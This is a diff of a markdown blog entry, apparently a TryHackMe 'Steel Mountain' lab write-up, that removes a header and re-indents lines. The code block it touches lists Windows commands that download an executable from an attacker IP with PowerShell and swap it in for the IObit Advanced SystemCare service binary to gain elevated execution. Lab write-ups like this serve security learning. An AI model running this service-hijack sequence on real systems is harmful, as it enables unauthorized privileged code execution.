@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2021-11-08-tryhackme-complete-be
 author: 100007
 ---
 
-# TryHackMe: Complete Beginner
-
-**author:** Nathan Acks  
-**date:** 2021-11-08
-
 # Steel Mountain
 
 Things got busy yesterday and I had to push finishing this section off a day. The machine’s new IP address is 10.10.174.199.
@@ -62,9 +57,9 @@ Putting this all together, we can replicate yesterday’s compromise by:
 powershell -c "Invoke-WebRequest -Uri http://10.13.26.40/ASCService.exe -OutFile ASCService.exe"
 sc.exe stop AdvancedSystemCareService9
 copy "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
-ASCService.exe.bak
+	ASCService.exe.bak
 copy /Y ASCService.exe
-"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+	"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
 sc.exe start AdvancedSystemCareService9
 ```
 
